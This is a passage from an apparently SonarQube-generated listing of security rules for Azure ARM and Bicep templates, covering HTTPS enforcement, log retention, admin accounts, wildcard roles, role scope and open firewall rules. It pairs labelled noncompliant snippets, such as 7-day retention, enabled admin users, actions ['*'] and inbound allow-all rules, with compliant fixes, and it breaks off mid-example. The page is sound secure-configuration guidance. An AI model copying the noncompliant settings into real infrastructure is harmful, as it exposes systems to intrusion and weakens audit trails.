<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-web" rel="nofollow">Microsoft.Web/sites/config</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites/config&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;ftpsState&#34;: &#34;FtpsOnly&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="9" data-diff-type="compliant">
resource symbolicname &#39;Microsoft.Web/sites/config&#64;2022-09-01&#39; &#61; {
  properties: {
    ftpsState: &#39;FtpsOnly&#39;
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts" rel="nofollow">Microsoft.Storage/storageAccounts</a>:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;supportsHttpsTrafficOnly&#34;: true
      }
    }
  ]
}
</pre>
<pre data-diff-id="10" data-diff-type="compliant">
resource symbolicname &#39;Microsoft.Storage/storageAccounts&#64;2022-09-01&#39; &#61; {
  properties: {
    supportsHttpsTrafficOnly: true
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/apis" rel="nofollow">Microsoft.ApiManagement/service/apis</a>:</p>
<pre data-diff-id="4" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.ApiManagement/service/apis&#34;,
      &#34;apiVersion&#34;: &#34;2022-08-01&#34;,
      &#34;properties&#34;: {
        &#34;protocols&#34;: [&#34;https&#34;]
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="compliant">
resource symbolicname &#39;Microsoft.ApiManagement/service/apis&#64;2022-08-01&#39; &#61; {
  properties: {
    protocols: [&#39;https&#39;]
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.cdn/profiles/endpoints" rel="nofollow">Microsoft.Cdn/profiles/endpoints</a>:</p>
<pre data-diff-id="5" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Cdn/profiles/endpoints&#34;,
      &#34;apiVersion&#34;: &#34;2021-06-01&#34;,
      &#34;properties&#34;: {
        &#34;isHttpAllowed&#34;: false
      }
    }
  ]
}
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
resource symbolicname &#39;Microsoft.Cdn/profiles/endpoints&#64;2021-06-01&#39; &#61; {
  properties: {
    isHttpAllowed: false
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.cache/redisenterprise/databases" rel="nofollow">Microsoft.Cache/redisEnterprise/databases</a>:</p>
<pre data-diff-id="6" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Cache/redisEnterprise/databases&#34;,
      &#34;apiVersion&#34;: &#34;2022-01-01&#34;,
      &#34;properties&#34;: {
        &#34;clientProtocol&#34;: &#34;Encrypted&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="13" data-diff-type="compliant">
resource symbolicname &#39;Microsoft.Cache/redisEnterprise/databases&#64;2022-01-01&#39; &#61; {
  properties: {
    clientProtocol: &#34;Encrypted&#34;
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers" rel="nofollow">Microsoft.DBforMySQL/servers</a>, <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers" rel="nofollow">Microsoft.DBforMariaDB/servers</a>, and <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers" rel="nofollow">Microsoft.DBforPostgreSQL/servers</a>:</p>
<pre data-diff-id="7" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DBforMySQL/servers&#34;,
      &#34;apiVersion&#34;: &#34;2017-12-01&#34;,
      &#34;properties&#34;: {
        &#34;sslEnforcement&#34;: &#34;Enabled&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="14" data-diff-type="compliant">
resource symbolicname &#39;Microsoft.DBforMySQL/servers&#64;2017-12-01&#39; &#61; {
  properties: {
    sslEnforcement: &#34;Enabled&#34;
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6413">
              azureresourcemanager:S6413
            </a>
          </td>
          <td>
            <details>
              <p>Defining a short log retention duration can reduce an organization’s ability to backtrace the actions of malicious actors in case of a security
incident.</p>
<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage
enables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>
<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will
allow investigators to establish a timeline of the actions perpetrated by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This component is essential for the information system infrastructure. </li><li> This component is essential for mission-critical functions. </li><li> Compliance policies require traceability for a longer duration. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Setting log retention period to 14 days is the bare minimum. It’s recommended to increase it to 30 days or above.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview" rel="nofollow">Azure Firewall Policy</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Network/firewallPolicies&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-01&#34;,
      &#34;properties&#34;: {
        &#34;insights&#34;: {
          &#34;isEnabled&#34;: true,
          &#34;retentionDays&#34;: 7
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource firewallPolicy &#39;Microsoft.Network/firewallPolicies&#64;2022-07-01&#39; &#61; {
  properties: {
    insights: {
      isEnabled: true
      retentionDays: 7  // Sensitive
    }
  }
}
</pre>
<p>Raise issue when <code>retentionDays</code> is smaller than <code>14</code>, but not <code>0</code> (zero), or if <code>isEnabled</code> is
<code>false</code> or the <code>insights</code> block is missing.</p>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.network/networkwatchers/flowlogs" rel="nofollow">Microsoft Network Network Watchers Flow
Logs</a>:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Network/networkWatchers/flowLogs&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-01&#34;,
      &#34;properties&#34;: {
        &#34;retentionPolicy&#34;: {
          &#34;days&#34;: 7,
          &#34;enabled&#34;: true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource networkWatchersFlowLogs &#39;Microsoft.Network/networkWatchers/flowLogs&#64;2022-07-01&#39; &#61; {
  properties: {
    retentionPolicy: {
      days: 7
      enabled: true
    }
  }
}
</pre>
<p>Raise issue when <code>days</code> is smaller than <code>14</code>, but not <code>0</code> (zero), or if <code>enabled</code> is set to
<code>false</code> or <code>retentionPolicy</code> is missing.</p>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/2021-11-01/servers/auditingsettings" rel="nofollow">Microsoft SQL Servers Auditing
Settings</a>:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Sql/servers/auditingSettings&#34;,
      &#34;apiVersion&#34;: &#34;2021-11-01&#34;,
      &#34;properties&#34;: {
        &#34;retentionDays&#34;: 7
      }
    }
  ]
}
</pre>
<pre data-diff-id="6" data-diff-type="noncompliant">
resource sqlServerAudit &#39;Microsoft.Sql/servers/auditingSettings&#64;2021-11-01&#39; &#61; {
  properties: {
    retentionDays: 7    // Sensitive
  }
}
</pre>
<p>Raise issue when retentionDays is smaller than <code>14</code>, but not <code>0</code> (zero).</p>
<p>The same case applies to other types (when <code>type</code> field is set to one of following):</p>
<ul><li> <code>Microsoft.DBforMariaDB/servers/securityAlertPolicies</code> - for <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/2018-06-01/servers/securityalertpolicies" rel="nofollow">Microsoft DB for MariaDB
  Servers Security Alert Policies</a> </li><li> <code>Microsoft.Sql/servers/databases/securityAlertPolicies</code> - for <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/servers/databases/securityalertpolicies" rel="nofollow">Microsoft Sql Servers Databases
  Security Alert Policies</a> </li><li> <code>Microsoft.Sql/servers/auditingPolicies</code> - for <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/servers/auditingpolicies" rel="nofollow">Microsoft Sql Servers Auditing Policies</a> </li><li> <code>Microsoft.Synapse/workspaces/auditingSettings</code> - for <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.synapse/2021-06-01/workspaces/auditingsettings" rel="nofollow">Microsoft Synapse Workspaces
  Auditing Settings</a> </li><li> <code>Microsoft.Synapse/workspaces/sqlPools/securityAlertPolicies</code> - for <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.synapse/workspaces/sqlpools/securityalertpolicies?pivots&#61;deployment-language-bicep" rel="nofollow">Microsoft Synapse Workspaces Sql Pools Security Alert Policies</a> </li></ul>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview" rel="nofollow">Azure Firewall Policy</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Network/firewallPolicies&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-01&#34;,
      &#34;properties&#34;: {
        &#34;insights&#34;: {
          &#34;isEnabled&#34;: true,
          &#34;retentionDays&#34;: 30
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
resource firewallPolicy &#39;Microsoft.Network/firewallPolicies&#64;2022-07-01&#39; &#61; {
  properties: {
    insights: {
      isEnabled: true
      retentionDays: 30  // Compliant
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.network/networkwatchers/flowlogs" rel="nofollow">Microsoft Network Network Watchers Flow
Logs</a>:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Network/networkWatchers/flowLogs&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-01&#34;,
      &#34;properties&#34;: {
        &#34;retentionPolicy&#34;: {
          &#34;days&#34;: 30,
          &#34;enabled&#34;: true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
resource networkWatchersFlowLogs &#39;Microsoft.Network/networkWatchers/flowLogs&#64;2022-07-01&#39; &#61; {
  properties: {
    retentionPolicy: {
      days: 30      // Compliant
      enabled: true
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/2021-11-01/servers/auditingsettings" rel="nofollow">Microsoft SQL Servers Auditing
Settings</a>:</p>
<pre data-diff-id="5" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Sql/servers/auditingSettings&#34;,
      &#34;apiVersion&#34;: &#34;2021-11-01&#34;,
      &#34;properties&#34;: {
        &#34;retentionDays&#34;: 30
      }
    }
  ]
}
</pre>
<pre data-diff-id="6" data-diff-type="compliant">
resource sqlServerAudit &#39;Microsoft.Sql/servers/auditingSettings&#64;2021-11-01&#39; &#61; {
  properties: {
    retentionDays: 30    // Compliant
  }
}
</pre>
<p>Above code also applies to other types defined in previous paragraph.</p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6379">
              azureresourcemanager:S6379
            </a>
          </td>
          <td>
            <details>
              <p>Enabling Azure resource-specific admin accounts can reduce an organization’s ability to protect itself against account or service account
thefts.</p>
<p>Full Administrator permissions fail to correctly separate duties and create potentially critical attack vectors on the impacted resources.</p>
<p>In case of abuse of elevated permissions, both the data on which impacted resources operate and their access traceability are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Azure resource is essential for the information system infrastructure. </li><li> This Azure resource is essential for mission-critical functions. </li><li> Compliance policies require this resource to disable its administrative accounts or permissions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Disable the administrative accounts or permissions in this Azure resource.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools" rel="nofollow">Azure Batch Pools</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Batch/batchAccounts/pools&#34;,
            &#34;apiVersion&#34;: &#34;2022-10-01&#34;,
            &#34;properties&#34;: {
                &#34;startTask&#34;: {
                    &#34;userIdentity&#34;: {
                        &#34;autoUser&#34;: {
                            &#34;elevationLevel&#34;: &#34;Admin&#34;
                        }
                    }
                }
            }
        }
    ]
}
</pre>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource AdminBatchPool &#39;Microsoft.Batch/batchAccounts/pools&#64;2022-10-01&#39; &#61; {
  properties: {
    startTask: {
      userIdentity: {
        autoUser: {
          elevationLevel: &#39;Admin&#39; // Noncompliant
        }
      }
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/container-registry/" rel="nofollow">Azure Container Registries</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.ContainerRegistry/registries&#34;,
            &#34;apiVersion&#34;: &#34;2023-01-01-preview&#34;,
            &#34;properties&#34;: {
                &#34;adminUserEnabled&#34;: true
            }
        }
    ]
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource acrAdminUserDisabled &#39;Microsoft.ContainerRegistry/registries&#64;2021-09-01&#39; &#61; {
  properties: {
    adminUserEnabled: true // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools" rel="nofollow">Azure Batch Pools</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Batch/batchAccounts/pools&#34;,
            &#34;apiVersion&#34;: &#34;2022-10-01&#34;,
            &#34;properties&#34;: {
                &#34;startTask&#34;: {
                    &#34;userIdentity&#34;: {
                        &#34;autoUser&#34;: {
                            &#34;elevationLevel&#34;: &#34;NonAdmin&#34;
                        }
                    }
                }
            }
        }
    ]
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
resource AdminBatchPool &#39;Microsoft.Batch/batchAccounts/pools&#64;2022-10-01&#39; &#61; {
  properties: {
    startTask: {
      userIdentity: {
        autoUser: {
          elevationLevel: &#39;NonAdmin&#39; // Compliant
        }
      }
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/container-registry/" rel="nofollow">Azure Container Registries</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.ContainerRegistry/registries&#34;,
            &#34;apiVersion&#34;: &#34;2023-01-01-preview&#34;,
            &#34;properties&#34;: {
                &#34;adminUserEnabled&#34;: false
            }
        }
    ]
}
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
resource acrAdminUserDisabled &#39;Microsoft.ContainerRegistry/registries&#64;2021-09-01&#39; &#61; {
  properties: {
    adminUserEnabled: false // Compliant
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6385">
              azureresourcemanager:S6385
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Defining a custom role for a Subscription or a Management group that allows all actions will give them the same capabilities as the built-in Owner
role. It’s recommended to limit the number of subscription owners in order to mitigate the risk of being breached by a compromised owner.</p>
<p>This rule raises an issue when a custom role has an assignable scope set to a Subscription or a Management Group and allows all actions
(<code>*</code>) ¨</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Authorization/roleDefinitions&#34;,
      &#34;apiVersion&#34;: &#34;2022-04-01&#34;,
      &#34;properties&#34;: {
        &#34;permissions&#34;: [
          {
            &#34;actions&#34;: [&#34;*&#34;],
            &#34;notActions&#34;: []
          }
        ],
        &#34;assignableScopes&#34;: [
          &#34;[subscription().id]&#34;
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
targetScope &#61; &#39;managementGroup&#39;

resource roleDef &#39;Microsoft.Authorization/roleDefinitions&#64;2022-04-01&#39; &#61; { // Sensitive
  properties: {
    permissions: [
      {
        actions: [&#39;*&#39;]
        notActions: []
      }
    ]

    assignableScopes: [
      managementGroup().id
    ]
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Authorization/roleDefinitions&#34;,
      &#34;apiVersion&#34;: &#34;2022-04-01&#34;,
      &#34;properties&#34;: {
        &#34;permissions&#34;: [
          {
            &#34;actions&#34;: [&#34;Microsoft.Compute/*&#34;],
            &#34;notActions&#34;: []
          }
        ],
        &#34;assignableScopes&#34;: [
          &#34;[subscription().id]&#34;
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
targetScope &#61; &#39;managementGroup&#39;

resource roleDef &#39;Microsoft.Authorization/roleDefinitions&#64;2022-04-01&#39; &#61; {
  properties: {
    permissions: [
      {
        actions: [&#39;Microsoft.Compute/*&#39;]
        notActions: []
      }
    ]

    assignableScopes: [
      managementGroup().id
    ]
  }
}
</pre>
<h3>Going the extra mile</h3>
<p>Here is a list of recommendations that can be followed regarding good usages of roles: * Apply the least privilege principle by creating a custom
role with as few permissions as possible. * As custom role can be updated, gradually add atomic permissions when required. * Limit the assignable
scopes of the custom role to a set of Resources or Ressource Groups. * When necessary, use the built-in Owner role instead of a custom role granting
subscription owner capabilities. * Limit the assignments of Owner roles to less than three people or service principals.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access
  Control </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/custom-roles" rel="nofollow">Azure Documentation</a> - Azure custom roles </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices" rel="nofollow">Azure Documentation</a> - Best practices for Azure
  RBAC </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6387">
              azureresourcemanager:S6387
            </a>
          </td>
          <td>
            <details>
              <p>Azure RBAC roles can be assigned to users, groups, or service principals. A role assignment grants permissions on a predefined set of resources
called &#34;scope&#34;.</p>
<p>The widest scopes a role can be assigned to are:</p>
<ul><li> Subscription: a role assigned with this scope grants access to all resources of this Subscription. </li><li> Management Group: a scope assigned with this scope grants access to all resources of all the Subscriptions in this Management Group. </li></ul>
<p>In case of security incidents involving a compromised identity (user, group, or service principal), limiting its role assignment to the narrowest
scope possible helps separate duties and limits what resources are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The user, group, or service principal doesn’t use the entirety of the resources in the scope to operate on a day-to-day basis. </li><li> It is possible to follow the Separation of Duties principle and split the scope into multiple role assignments with a narrower scope. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Limit the scope of the role assignment to a Resource or Resource Group. </li><li> Apply the least privilege principle by assigning roles granting as few permissions as possible. </li></ul>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2018-05-01/subscriptionDeploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Authorization/roleAssignments&#34;,
      &#34;apiVersion&#34;: &#34;2022-04-01&#34;,
      &#34;name&#34;: &#34;[guid(subscription().id, &#39;exampleRoleAssignment&#39;)]&#34;
    }
  ]
}
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="2" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Authorization/roleAssignments&#34;,
      &#34;apiVersion&#34;: &#34;2022-04-01&#34;,
      &#34;name&#34;: &#34;[guid(resourceGroup().id, &#39;exampleRoleAssignment&#39;)]&#34;
    }
  ]
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access
  Control </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/scope-overview" rel="nofollow">Azure Documentation</a> - Understand scope for Azure
  RBAC </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices" rel="nofollow">Azure Documentation</a> - Best practices for Azure
  RBAC </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6321">
              azureresourcemanager:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as Azure support virtual firewalls that can be used to restrict access to services by controlling inbound and outbound
traffic.<br /> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services traditionally listen,
such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1&#61;h_ls" rel="nofollow">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Network/networkSecurityGroups/securityRules&#34;,
            &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
            &#34;properties&#34;: {
                &#34;protocol&#34;: &#34;*&#34;,
                &#34;destinationPortRange&#34;: &#34;*&#34;,
                &#34;sourceAddressPrefix&#34;: &#34;*&#34;,
                &#34;access&#34;: &#34;Allow&#34;,
                &#34;direction&#34;: &#34;Inbound&#34;
            }
        }
    ]
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource securityRules &#39;Microsoft.Network/networkSecurityGroups/securityRules&#64;2022-11-01&#39; &#61; {
  name: &#39;securityRules&#39;
  properties: {
    direction: &#39;Inbound&#39;
    access: &#39;Allow&#39;
    protocol: &#39;*&#39;
    destinationPortRange: &#39;*&#39;
    sourceAddressPrefix: &#39;*&#39;
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Network/networkSecurityGroups/securityRules&#34;,
            &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
            &#34;properties&#34;: {
                &#34;protocol&#34;: &#34;*&#34;,
                &#34;destinationPortRange&#34;: &#34;22&#34;,
